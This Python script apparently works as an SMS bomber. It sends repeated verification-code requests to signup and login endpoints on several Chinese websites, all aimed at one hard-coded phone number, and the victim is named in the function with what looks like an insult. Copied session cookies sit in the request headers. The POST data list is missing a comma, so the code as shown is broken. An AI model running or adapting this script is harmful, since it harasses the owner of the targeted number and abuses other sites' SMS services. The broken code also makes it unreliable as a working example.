import requests
import test

PHONE = '17508249247'

GET_URLS = [
	'https://uac.10010.com/oauth2/OpSms?callback=jsonp1501665698500&req_time=1501665713979&user_id=%s&app_code=ECS-YH-WAP' % PHONE,
	
]
GET_REFERER = [
	'',
]

POST_URLS = [
	'http://open.epicc.com.cn/eplatform/loginRegister/register/saveYZM',
	'http://m.beequick.cn/submit/sendVerifySMS',
	'http://www.faisco.cn/ajax/reg_h.jsp',
	'http://www.baixing.com/oz/validateMobile',
	'http://www.cfyd168.com/ajaxapi.php',
]
POST_DATAS = [
	{ 'mobile': PHONE },
	{ 'lat': '39', 'lng': '116', 'simulate_mobile': 'true', 'asid': '5a0ce6b68e5ab4201', '_r': '0.9357775703859941', 'reflogid': '5a0ce73a582ea4151', 'location_hash': 'b58a9feeq8Tw2iXiJB/ZHsxzjaVSXl1YaUmISk3KiuV83Pwu82d1Dqlm6B4mYpiNKHkslyqRS0d1nlfCuxwHBJ8S81', 'phone': PHONE, 'voice': 0 },
	{ 'cmd': 'checkCacctNew', 'cacct': PHONE, 'acctType': 1 },
	{ 'mobile': PHONE }
	{ 'a': 'SendMSG', 't': 2, 'mo': PHONE }
]

headers = { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
			"Accept": "text/plain",
			"Cookie": "BEEID=5a0ce6b650b8d1905; geologid=h5mb20171116091746L5a0ce73a582ea4151X1490354278455"
}

def sendMsg2SB():
	index = -1
	for url in POST_URLS:
		index += 1

		# if index < 5:
		# 	continue
		# referer = POST_REFERERS[index]
		# if len(referer) > 0:
		# 	headers['Referer'] = referer

		body = POST_DATAS[index]
		r = requests.post(url, params=body, headers=headers)
		print(r.status_code)

	index = -1
	for url in GET_URLS:
		index += 1

		# if index < 2:
		# 	continue
		# referer = GET_REFERER[index]
		# if len(referer) > 0:
		# 	headers['Referer'] = referer

		r = requests.get(url, headers=headers)
		print(r.status_code)



















